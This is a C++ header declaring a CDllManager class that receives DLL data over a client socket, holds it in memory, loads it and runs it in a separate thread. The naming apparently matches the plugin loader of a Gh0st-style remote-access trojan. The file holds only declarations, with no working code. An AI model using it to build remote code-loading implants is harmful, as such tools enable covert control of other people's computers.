// DllManager.h: interface for the CDllManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_DllManager_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_)
#define AFX_DllManager_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_
//#include <winsock2.h>
#include <list>
#include <string>

#include "Manager.h"
using namespace std;
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class CDllManager : public CManager
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	CDllManager(CClientSocket *pClient, LPBYTE bytex/*, DWORD datasize*/);
	virtual ~CDllManager();

	DWORD m_dwDataSize;
private:
//	list <string> m_UploadList;
	LPBYTE blparam;
	UINT m_nTransferMode;
	char m_strCurrentProcessFileName[MAX_PATH]; // 当前正在处理的文件
	__int64 m_nCurrentProcessFileLength; // 当前正在处理的文件的长度
	int	SendToken(BYTE bToken);
 	void CreateLocalRecvFile(LPBYTE lpBuffer);
 	void GetFileData();
 	void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
protected:
	HANDLE hDllFile;
	void*  MemDll;
	int    SizeDll;
	DWORD  BytesRead;
	void LoadLib(LPBYTE xx);
	void SendDllVersion(LPCTSTR lpDllName);
	LPBYTE getDllVersion(LPCTSTR lpDllName);
	typedef void (WINAPI * MAINDLL)();
	char lpDllPath[MAX_PATH];
	static	DWORD WINAPI DllThread(LPCTSTR lpDllName);
	HANDLE	m_hThread; 
};

#endif // !defined(AFX_DllManager_H__359D0039_E61F_46D6_86D6_A405E998FB47__INCLUDED_)
